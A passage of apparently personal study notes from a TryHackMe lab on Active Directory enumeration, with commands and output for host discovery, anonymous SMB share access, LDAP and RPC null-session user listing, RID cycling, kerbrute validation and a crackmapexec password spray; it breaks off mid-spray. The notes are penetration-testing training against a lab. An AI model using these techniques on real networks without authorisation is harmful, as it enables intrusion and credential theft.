# Intro

Learn how to enumerate an [Active Directory](./Active%20Directory.md) network and get initial access.

[Active Directory ](Active%20Directory.md)(AD) enumeration is a crucial first step in penetration testing Microsoft [Windows](./Windows.md) enterprise networks. During many internal penetration tests, we are often given VPN access to the target network without user credentials. That means we need to gather as much information as possible about the domain: users, groups, computers, and policies. This will allow us to identify potential vulnerabilities or attack paths that might give us an initial foothold, such as access to a user’s workstation.

## Learning Objectives

In this room, we’ll learn how to:

- Enumerate the target domain and network.
- Enumerate valid domain users and identify misconfigurations.
- Perform password spraying attacks to get your first pair of valid AD credentials.
- Discover sensitive credentials stored in configuration files.
# Mapping Out the Network

We've just been given VPN access to an Active Directory network. We don't have any credentials yet; only our attacking machine is equipped with the greatest and latest tools. Our goal is to discover the structure of the Active Directory environment, identify hosts and services, and map out the network. Let's imagine for a second that we don't have a nice network diagram, and are given the following subnet as part of our scope: `10.211.11.0/24`
## Host Discovery

One of the first things we can do is run a subnet host discovery scan. This will allow us to identify all live hosts in our target network range. Most clients will include a subnet range in the pentest scope, so we must discover all active hosts we might want to target. We will showcase two different tools that can be used for initial host discovery.
### Fping

Just like **ping**, **fping** uses Internet Control Message Protocol (ICMP) requests to determine if a host is live or not. However, with **fping**, we can specify any number of targets, including a subnet, making it more versatile than the **ping** command. Instead of sending a packet to one target until it replies or times out, **fping** will move to the next target after each request.

We can run the following command to discover live hosts in our target network:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ fping -agq 10.211.11.0/24          
10.211.11.10
10.211.11.20
10.211.11.250
```

- `-a`: shows systems that are alive.
- `-g`: generates a target list from a supplied IP netmask.
- `-q`: quiet mode, doesn't show per-probe results or ICMP error messages.

After running this command, we identify four live hosts.**10.200.12.1** is the gateway, and **10.200.12.250** is the VPN server, so we can ignore these two hosts since they are out of scope. We can conveniently add the two IPS we've discovered to a text file called "hosts.txt" for our port scans.
### Nmap

We can also use [Nmap](../Hacking%20Tools/Nmap.md) in ping scan mode (`-sn`) to probe the entire subnet:

`nmap -sn 10.211.11.0/24`

- `-sn`: Ping scan to determine which hosts are up without port scanning.

## Port Scanning

Once we've discovered live hosts, we must identify which one is the Domain Controller (DC) to determine which critical AD-related services are being used and can be exploited. These are some common Active Directory ports and protocols:

|Port|Protocol|What it Means|
|---|---|---|
|88|Kerberos|Potential for Kerberos-based enumeration|
|135|MS-RPC|Potential for RPC enumeration (null sessions)|
|139|SMB/NetBIOS|Legacy SMB access|
|389|LDAP|LDAP queries to AD|
|445|SMB|Modern SMB access, critical for enumeration|
|464|Kerberos (kpasswd)|Password-related Kerberos service|

We can run a service version scan with these specific ports to help identify the DC:

`nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt`

- `-sV`: This enables version detection. Nmap will try to determine the version of the services running on the open ports.
- `-sC`: Runs Nmap Scripting Engine (NSE) scripts in the default category.
- `-iL`: This tells Nmap to read the list of target hosts from the file `hosts.txt`. Each line in this file should contain a single IP address or hostname.

We can spot the Domain Controller because it will often have ports 88 (Kerberos), 389 (LDAP), and 445 (SMB) open, with banners like 'Windows Server' or even domain names revealed in the output of our nmap command.

If we were running a more exhaustive assessment or dealing with unfamiliar environments, starting with a full port scan ensures we don't miss critical services running on non-standard ports. We could use this command to scan for all open ports:

`nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt`

- `-sS`: TCP SYN scan, which is stealthier than a full connect scan
- `-p-`: Scans all 65,535 TCP ports.
- `-T3`: Sets the timing template to "normal" to balance speed and stealth.
- `-iL hosts.txt`: Inputs the list of live hosts from the previous nmap command.
- `-oN full_port_scan.txt`: Outputs the results to a file.

Through these enumeration techniques, we have identified two live hosts in our target network, one DC and one Workstation, and the domain. We have also confirmed a couple of known services running on the DC, which we can target to further enumerate the domain :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ nmap -p 88,135,139,389,445 -sV -sC -iL hosts    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 15:10 CEST
Nmap scan report for 10.211.11.20
Host is up (0.16s latency).

PORT    STATE  SERVICE       VERSION
88/tcp  closed kerberos-sec
135/tcp open   msrpc         Microsoft Windows RPC
139/tcp open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp closed ldap
445/tcp open   microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-25T13:10:40
|_  start_date: N/A
|_clock-skew: -1s

Nmap scan report for 10.211.11.10
Host is up (0.16s latency).

PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-25 13:10:35Z)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: DC
|   NetBIOS computer name: DC\x00
|   Domain name: tryhackme.loc
|   Forest name: tryhackme.loc
|   FQDN: DC.tryhackme.loc
|_  System time: 2025-07-25T13:10:48+00:00
| smb2-time: 
|   date: 2025-07-25T13:10:45
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2s, deviation: 5s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 44.32 seconds

```

# Network Enumeration With SMB

We will focus on enumerating network shares using the Server Message Block (SMB) protocol. We will use various tools like Nmap to discover the relevant listening ports and identify services. Then, we will attempt to access their contents from the AttackBox using tools such as `smbclient` and `smbmap`. Furthermore, we will try to grab the contents of accessible SMB shares. Finally, we will mention a few more relevant tools. Let’s begin!

## Discovering Services

We will begin our “discovery” with the good old Nmap. We are mainly interested in MS Windows and Active Directory-related ports. We will limit our scan to the following ports:

- **TCP 88 (Kerberos)**: Kerberos uses this port for authentication in the Active Directory. From a penetration testing point of view, it can be a goldmine for ticket attacks like Pass-the-Ticket and Kerberoasting.
- **TCP 135 (RPC Endpoint Mapper)**: This TCP port is used for Remote Procedure Calls (RPC). It might be leveraged to identify services for lateral movement or remote code execution via DCOM.
- **TCP 139 (NetBIOS Session Service)**: This port is used for file sharing in older Windows systems. It can be abused for null sessions and information gathering.
- **TCP 389 (LDAP)**: This TCP port is used by the Lightweight Directory Access Protocol (LDAP). It is in plaintext and can be a prime target for enumerating AD objects, users, and policies.
- **TCP 445 (SMB)**: Critical for file sharing and remote admin; abused for exploits like EternalBlue, SMB relay attacks, and credential theft.
- **TCP 636 (LDAPS)**: This port is used by Secure LDAP. Although it is encrypted, it can still expose AD structure if misconfigured and can be abused via certificate-based attacks like AD CS exploitation.

We can use the Nmap scanner to check if any active services are listening on these ports, attempt to detect their versions with `-sV`, and allow default scripts to run with `-sC`. Our final command will be, `nmap -p 88,135,139,389,445,636 -sV -sC TARGET_IP`. The result of scanning the domain controller is shown below :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ nmap -p 88,135,139,389,445,636 -sV -sC 10.211.11.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 15:17 CEST
Nmap scan report for 10.211.11.10
Host is up (0.10s latency).

PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-25 13:18:18Z)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)
636/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: DC
|   NetBIOS computer name: DC\x00
|   Domain name: tryhackme.loc
|   Forest name: tryhackme.loc
|   FQDN: DC.tryhackme.loc
|_  System time: 2025-07-25T13:18:21+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-25T13:18:23
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 1s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.84 seconds

```

The above open ports indicate an MS Windows Active Directory environment. The presence of Kerberos and LDAP ports might indicate that this is part of an Active Directory domain or even a domain controller.

## Listing SMB Shares

At this stage, we don’t have valid credentials. Let’s check the exposed SMB shares and see if we can connect to any of them anonymously. We will try an anonymous connection, also known as a null session because it uses no username or password, and see if we can get access. There are two good tools for enumerating SMB shares from a Linux box: `smbclient` and `smbmap`.

[SMBclient](../Hacking%20Tools/SMBclient.md) is a command-line tool that allows interaction with SMB shares and is part of the Samba suite. It is similar to an FTP client. You can use it to list, upload, download, and browse files on a remote SMB server. In the terminal below, we try to list the shares via the `-L` option, with no password, hence the `-N` option. We can see some interesting shares below running `smbclient -L //TARGET_IP -N` :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ smbclient -L //10.211.11.10 -N  

Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        AnonShare       Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SharedFiles     Disk      
        SYSVOL          Disk      Logon server share 
        UserBackups     Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.211.11.10 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Another tool is `smbmap`, a reconnaissance tool that enumerates SMB shares across a host. It can be used to display read and write permissions for each share. It’s instrumental for quickly identifying accessible or misconfigured shares without manually connecting to each one. Below is an example of running `smbmap -H TARGET_IP` :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ smbmap -H 10.211.11.10        

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[+] IP: 10.211.11.10:445        Name: 10.211.11.10              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        AnonShare                                               READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SharedFiles                                             READ, WRITE
        SYSVOL                                                  NO ACCESS       Logon server share 
        UserBackups                                             READ, WRITE

```

Running either of the above commands, we can notice that there are three non-standard shares that catch our attention: `AnonShare`, `SharedFiles` and `UserBackups`.

It is worth noting that you can also discover which shares grant access using Nmap. Using Nmap’s `smb-enum-shares` script, we can explore which shares give READ/WRITE, READ, or no access. The syntax is `nmap -p445 --script smb-enum-shares 10.211.11.10`.
## Accessing SMB Shares

Now that we have listed the shares, let’s attempt to access the ones that allow anonymous access. We might discover any interesting files that might help us gain access. We will target all the shares that showed `READ` access among their permissions when we ran `smbmap`. To use `smbclient` to connect to a share, you can use `smbclient //TARGET_IP/SHARE_NAME -N`. After connecting, we listed the files by issuing `ls` as shown below. Once you find the filename, you can download it using `get file_name`. In the terminal above, we did a `get Mouse_and_Malware.txt` to download the file to the AttackBox :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ smbclient //10.211.11.10/SharedFiles -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 25 15:23:43 2025
  ..                                  D        0  Fri Jul 25 15:23:43 2025
  Mouse_and_Malware.txt               A     1141  Thu May 15 11:40:19 2025

                7863807 blocks of size 4096. 3471321 blocks available
smb: \> get Mouse_and_Malware.txt 
getting file \Mouse_and_Malware.txt of size 1141 as Mouse_and_Malware.txt (2,8 KiloBytes/sec) (average 2,8 KiloBytes/sec)
smb: \> exit
                                
```

Since we don’t have login credentials, we are trying to access the various shares without a password, i.e., with the `-N` option. However, if you have a username and password to access the SMB share, you can easily specify them with `--user=USERNAME --password=PASSWORD` or `-U 'username%password'`. Note that for domain accounts, you need to specify the domain using `-W`.
## What Can We Find in SMB Shares

An anonymous SMB share is a horrible idea. However, system administrators may have enabled it for legacy systems to work. Maybe an old printer needs to read a file, or an old scanner needs to write a file.

From a penetration testers’ point of view, SMB shares might contain configuration files, backup files, scripts, and even documents. After all, accessing a particular folder from any computer on the network is convenient. If the folder allows writing, it will only encourage users to upload more files. Some files might contain usernames or even credentials with a password that never got changed. In summary, it is essential to thoroughly search for any available shares as you might uncover useful hidden secrets.
## Other Tools and Resources

There are other tools that can be pretty useful as well. Examples include `impacket-smbclient`, which is a Python-based implementation of `smbclient` available from the Impacket toolkit. The Impacket toolkit is available on the AttackBox in the `/opt/impacket/examples/` directory.

[CrackMapExec](https://www.kali.org/tools/crackmapexec/) is not only for post-exploitation but also for enumeration. It includes many [SMB](./SMB.md) modules for listing shares, testing credentials, and many others.

The [Enum4linux](../Hacking%20Tools/Enum4linux.md) or `enum4linux-ng` is a powerful tool that performs extensive enumeration over SMB. You can try `enum4linux -a TARGET_IP` to get a trove of information. It might be a good idea to redirect the output to a file so that you can go through it slowly.

Finally, as mentioned earlier in this task, we should not forget [Nmap](../Hacking%20Tools/Nmap.md) with the `smb-enum-shares` script.
## Flag

What is the flag hidden in one of the shares?

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ smbclient //10.211.11.10/UserBackups -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 25 15:23:46 2025
  ..                                  D        0  Fri Jul 25 15:23:46 2025
  flag.txt                            A       14  Thu May 15 11:34:33 2025
  story.txt                           A      953  Thu May 15 11:37:57 2025

                7863807 blocks of size 4096. 3471284 blocks available
smb: \> get flag.txt
getting file \flag.txt of size 14 as flag.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
smb: \> get story.txt
getting file \story.txt of size 953 as story.txt (0,7 KiloBytes/sec) (average 0,4 KiloBytes/sec)
smb: \> exit
                                                                                                                         
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ ls
DCscan.md  flag.txt  hosts  Mouse_and_Malware.txt  story.txt
                                                                                                                         
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ cat story.txt            
**The Fox and the Drone**

A hungry Fox wandered through the edge of a village, where he saw a shining object buzzing above the farmer's field.

It was a Drone�swift, sleek, and humming with pride. It hovered effortlessly in the air, taking photos of the world below.

"Why walk when I can fly?" the Drone called down. "Look at you, stuck on the ground, always searching for scraps. I see everything from above and never get my paws dirty."

The Fox narrowed his eyes. "Impressive. But do you ever land?"

"Why would I?" scoffed the Drone. "Up here, I�m untouchable!"

Just then, its battery warning blinked red.

The Drone started descending, slower than it liked, until it landed clumsily in the middle of the field. Before it could take off again, the farmer�s curious dog came trotting over, teeth bared.

The Fox chuckled from the hedges.

"Seems the sky�s not so safe after all," he murmured, and trotted off in search of supper.                                                                                                                         
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ cat flag.txt 
THM{88_SMB_88}                                                                                              
```

# Domain Enumeration

Now that we have a better understanding of our target's network, it's time to enumerate users to help us identify valid accounts and potential targets. Usernames can be gathered through various unauthenticated methods, each relying on different misconfigurations.

In this task, we'll explore some of the tools and techniques needed for successful user [Enumeration](./Enumeration.md).
## LDAP Enumeration (Anonymous Bind)

Lightweight Directory Access Protocol (LDAP) is a widely used protocol for accessing and managing directory services, such as Microsoft Active Directory. LDAP helps locate and organise resources within a network, including users, groups, devices, and organisational information, by providing a central directory that applications and users can query.  
Some LDAP servers allow anonymous users to perform read-only queries. This can expose user accounts and other directory information.

We can test if anonymous LDAP bind is enabled with `ldapsearch`:

`ldapsearch -x -H ldap://10.211.11.10 -s base`

- `-x`: Simple authentication, in our case, anonymous authentication.
- `-H`: Specifies the LDAP server.
- `-s`: Limits the query only to the base object and does not search subtrees or children.

If it is enabled, we should see lots of data, similar to the output below, We can then query user information with this command:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)" >> LDAPenum.md
```

## Enum4linux-ng

**enum4linux-ng** is a tool that automates various enumeration techniques against Windows systems, including user enumeration. It utilizes SMB and RPC protocols to gather information such as user lists, group memberships, and share details.

We can run the following command to get as much information as possible from the DC:

`enum4linux-ng -A 10.211.11.10 -oA results.txt`

- `-A`: Performs all available enumeration functions (users, groups, shares, password policy, RID cycling, OS information and NetBIOS information).
- `-oA`: Writes output to YAML and JSON files.
## RPC Enumeration (Null Sessions)

[Microsoft Remote Procedure Call (MSRPC)](./Microsoft%20Remote%20Procedure%20Call%20(MSRPC).md) is a protocol that enables a program running on one computer to request services from a program on another computer, without needing to understand the underlying details of the network. RPC services can be accessed over the SMB protocol. When SMB is configured to allow null sessions that do not require authentication, an unauthenticated user can connect to the IPC$ share and enumerate users, groups, shares, and other sensitive information from the system or domain.

We can run the following command to verify null session access with:

`rpcclient -U "" 10.211.11.10 -N`

- `-U`: Used to specify the username, in our case, we are using an empty string for anonymous login.
- `-N`: Tells RPC not to prompt us for a password.

If successful, we can enumerate users with: `enumdomusers`

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ rpcclient -U "" 10.211.11.10 -N
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[sshd] rid:[0x649]
user:[gerald.burgess] rid:[0x650]
user:[nigel.parsons] rid:[0x651]
user:[guy.smith] rid:[0x652]
user:[jeremy.booth] rid:[0x653]
user:[barbara.jones] rid:[0x654]
user:[marion.kay] rid:[0x655]
user:[kathryn.williams] rid:[0x656]
user:[danny.baker] rid:[0x657]
user:[gary.clarke] rid:[0x658]
user:[daniel.turner] rid:[0x659]
user:[debra.yates] rid:[0x65a]
user:[jeffrey.thompson] rid:[0x65b]
user:[martin.riley] rid:[0x65c]
user:[danielle.lee] rid:[0x65d]
user:[douglas.roberts] rid:[0x65e]
user:[dawn.bolton] rid:[0x65f]
user:[danielle.ali] rid:[0x660]
user:[michelle.palmer] rid:[0x661]
user:[katie.thomas] rid:[0x662]
user:[jennifer.harding] rid:[0x663]
user:[strategos] rid:[0x664]
user:[empanadal0v3r] rid:[0x665]
user:[drgonz0] rid:[0x666]
user:[strate905] rid:[0x667]
user:[krbtgtsvc] rid:[0x668]
user:[asrepuser1] rid:[0x669]
user:[rduke] rid:[0xa31]
user:[user] rid:[0x1201]
```
You can run **help** in the rpcclient shell to view the list of available commands. With the right permissions, we can enumerate the domain thoroughly through RPC.
## RID Cycling

In Active Directory, RID (Relative Identifier) ranges are used to assign unique identifiers to user and group objects. These RIDs are components of the Security Identifier (SID), which uniquely identifies each object within a domain. Certain RIDs are well-known and standardised.

**500** is the Administrator account, **501** is the Guest account and **512-514** are for the following groups: Domain Admins, Domain users and Domain guests. User accounts typically start from RID **1000** onwards.

We can use **enum4linux-ng** to determine the RID range, or we can start with a known range, for example, 1000-1200, and increment if we get results.

If `enumdomusers` is restricted, we can manually try querying each individual user RID with this bash command:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
```

- `for i in $(seq 500 2000)`: We first run a for loop to iterate through a range of possible RIDs to identify valid user accounts.
- `echo "queryuser $i"`: queries information about the user associated with RID $i.
- `2>/dev/null`: Redirects any error messages (standard error) to /dev/null, effectively silencing them.
- `| grep -i "User Name"`: filters the output to display lines containing "User Name", ignoring case sensitivity (`-i`).

Please note that this command can take 2-3 minutes to complete.
## Username Enumeration With Kerbrute

**Kerberos** is the primary authentication protocol for Microsoft [Windows](./Windows.md) domains. Unlike **NTLM**, which relies on a challenge-response mechanism, **Kerberos** uses a ticket-based system managed by a trusted third party, the **Key Distribution Centre (KDC)**. This approach not only enables mutual authentication between client and server but also leverages stronger encryption methods, making it generally more resilient against attacks. **[Kerbrute](../Hacking%20Tools/Kerbrute.md)** is a popular enumeration tool used to brute-force and enumerate valid [Active Directory](./Active%20Directory.md) users by abusing the Kerberos pre-authentication.

Tools like **enum4linux-ng** or **rpcclient** may return _some_ usernames, but they could be:

- Disabled accounts
- Non-domain accounts
- Fake honeypot users
- Or even false positives

Running those through **kerbrute** lets us confirm which ones are real, active AD users, which allows us to target them more accurately with password sprays.

We can create a user list thanks to the usernames we gathered with the previous tools :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ ./kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users    
   __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/25/25 - Ronnie Flathers @ropnop

2025/07/25 15:52:37 >  Using KDC(s):
2025/07/25 15:52:37 >   10.211.11.10:88

2025/07/25 15:52:37 >  [+] VALID USERNAME:       gerald.burgess@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       nigel.parsons@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       jeremy.booth@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       kathryn.williams@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       barbara.jones@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       marion.kay@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       gary.clarke@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       danny.baker@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       daniel.turner@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       debra.yates@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       martin.riley@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       danielle.lee@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       danielle.ali@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       douglas.roberts@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       jeffrey.thompson@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       strate905@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       empanadal0v3r@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       strategos@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       jennifer.harding@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       drgonz0@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       krbtgtsvc@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       rduke@tryhackme.loc
2025/07/25 15:52:37 >  [+] VALID USERNAME:       asrepuser1@tryhackme.loc
2025/07/25 15:52:38 >  [+] VALID USERNAME:       user@tryhackme.loc
2025/07/25 15:52:38 >  Done! Tested 31 usernames (24 valid) in 1.021 seconds           
```

As we can see in the output above, 24 out of the 31 users from our list are valid. We can use this information to update our user list

However, if our only choice is to use **kerbrute** for user enumeration because the other tools aren't working, we can download a wordlist like [this one](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt) to discover user accounts. Once we have found a valid list of users, we can add them to a file called users.txt that we will use during our password spraying attack.

Throughout this task, we have explored multiple tools to help us with domain enumeration, such as gathering valid domain users. With a valid list, we are ready to start our password spraying attack and get our first set of AD credentials.

Answer the questions below

What group is the user rduke part of? Domain Users

What is this user's full name? Raoul Duke

Which username is associated with RID 1634? katie.thomas
# Password Spraying

[Password spraying](./Password%20spraying.md) is an attack technique where a small set of common passwords is tested across many accounts. Unlike brute-force attacks, password spraying avoids account lockouts by testing each account with only a few attempts, exploiting poor password practices common in many organisations. Password spraying is often effective because many organisations:

- Require frequent password changes, leading users to pick predictable patterns (for example, `Summer2025!`).
- Don't enforce their policies well.
- Reuse common passwords across multiple accounts.

Common password lists for spraying include:

- Seasonal passwords.
- Default passwords used by IT teams (`Password123`).
- Passwords leaked in data breaches, like `rockyou.txt`.
## Password Policy

Before we can start our attack, it is essential to understand our target's password policy. This will allow us to retrieve information about the minimum password length, complexity, and the number of failed attempts that will lock out an account.

**rpcclient**

We can use rpcclient via a null session to query the DC for the password policy:

`rpcclient -U "" 10.211.11.10 -N`

And then we can run the `getdompwinfo` command:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ rpcclient -U "" 10.211.11.10 -N
rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000001
        DOMAIN_PASSWORD_COMPLEX
```
## **CrackMapExec**

**[CrackMapExec](../Hacking%20Tools/CrackMapExec.md)** is a well-known network service exploitation tool that we will use throughout this module. It allows us to perform enumeration, command execution, and post-exploitation attacks in Windows environments. It supports various network protocols, such as [SMB](./SMB.md), LDAP, [RDP](RDP.md), and [SSH](./SSH.md). If anonymous access is permitted, we can retrieve the password policy without credentials with the following command:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ crackmapexec smb 10.211.11.10 --pass-pol

SMB         10.211.11.10    445    DC               [+] Dumping password info for domain: TRYHACKME
SMB         10.211.11.10    445    DC               Minimum password length: 7
SMB         10.211.11.10    445    DC               Password history length: 24
SMB         10.211.11.10    445    DC               Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.211.11.10    445    DC               
SMB         10.211.11.10    445    DC               Password Complexity Flags: 000001
SMB         10.211.11.10    445    DC                   Domain Refuse Password Change: 0
SMB         10.211.11.10    445    DC                   Domain Password Store Cleartext: 0
SMB         10.211.11.10    445    DC                   Domain Password Lockout Admins: 0
SMB         10.211.11.10    445    DC                   Domain Password No Clear Change: 0
SMB         10.211.11.10    445    DC                   Domain Password No Anon Change: 0
SMB         10.211.11.10    445    DC                   Domain Password Complex: 1
SMB         10.211.11.10    445    DC               
SMB         10.211.11.10    445    DC               Minimum password age: 1 day 4 minutes 
SMB         10.211.11.10    445    DC               Reset Account Lockout Counter: 2 minutes 
SMB         10.211.11.10    445    DC               Locked Account Duration: 2 minutes 
SMB         10.211.11.10    445    DC               Account Lockout Threshold: 10
SMB         10.211.11.10    445    DC               Forced Log off Time: Not Set
```
## Performing Password Spraying Attacks

We have gathered a solid user list from our user enumeration in the previous task; we now need to create a small list of common passwords.  
Through our password policy enumeration, we saw that the password complexity is equal to 1:

- In **rpcclient**: `password_properties: 0x00000001`
- With **CrackMapExec**: `Password Complexity Flags: 000001`

This means that at least three of the following four conditions need to be respected for a password to be created:

1. Uppercase letters
2. Lowercase letters
3. Digits
4. Special characters

Also, passwords cannot contain the user's account name or parts of their full name exceeding two consecutive characters. We can refer to [this link](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994562\(v=ws.11\)) to understand Microsoft's password complexity definitions.

Let's imagine that through some [OSINT](./OSINT.md), we discovered that this company was in a data breach, and some of the known passwords were variations of the string "Password". We can create the following list, making sure to respect the password policy:

```bash                                                      
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ cat passwd                              
Password!
Password1
Password1!
P@ssword
Pa55word1
```

We can use **CrackMapExec** to run our password spraying attack against the WRK computer:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
└─$ crackmapexec smb 10.211.11.20 -u users -p passwd   

- - - - - - - - - - - - - - - - - - - - - - - - - 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\empanadal0v3r:Password! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\empanadal0v3r:Password1 STATUS_LOGON_FAILURE 
